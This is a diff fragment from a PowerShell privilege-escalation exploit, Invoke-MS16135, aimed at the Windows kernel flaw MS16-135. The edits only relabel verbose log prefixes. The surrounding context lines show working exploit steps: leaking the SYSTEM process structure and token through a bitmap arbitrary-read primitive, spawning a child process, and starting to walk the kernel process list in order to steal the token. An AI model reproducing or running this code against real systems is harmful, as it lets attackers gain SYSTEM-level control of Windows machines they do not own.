@@ -716,7 +716,7 @@ function Invoke-MS16135 {
 			}
 		}
 		
-		Write-Verbose "`n[>] Leaking SYSTEM _EPROCESS.."
+		Write-Verbose "`n[*] Leaking SYSTEM _EPROCESS.."
 		$SystemModuleArray = Get-LoadedModules
 		$KernelBase = $SystemModuleArray[0].ImageBase
 		$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
@@ -731,11 +731,11 @@ function Invoke-MS16135 {
 		Write-Verbose "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
 		$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
 		
-		Write-Verbose "`n[>] Spawn child"
+		Write-Verbose "`n[*] Spawn child"
 		
 		$npipeName = Get-Random
 
-		Write-Verbose "`n[>] Choosen name : $npipeName"
+		Write-Verbose "`n[*] Choosen name : $npipeName"
 		
 		$StartupInfo = New-Object STARTUPINFO
 		$StartupInfo.dwFlags = 0x00000001
@@ -765,7 +765,7 @@ function Invoke-MS16135 {
 		
 		Write-Verbose "[+] Child PID is : $("{0}" -f $ProcessInfo.dwProcessId)`n"
 		
-		Write-Verbose "`n[>] Leaking current _EPROCESS.."
+		Write-Verbose "`n[*] Leaking current _EPROCESS.."
 		Write-Verbose "[+] Traversing ActiveProcessLinks list"
 		$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
 		while($true) {
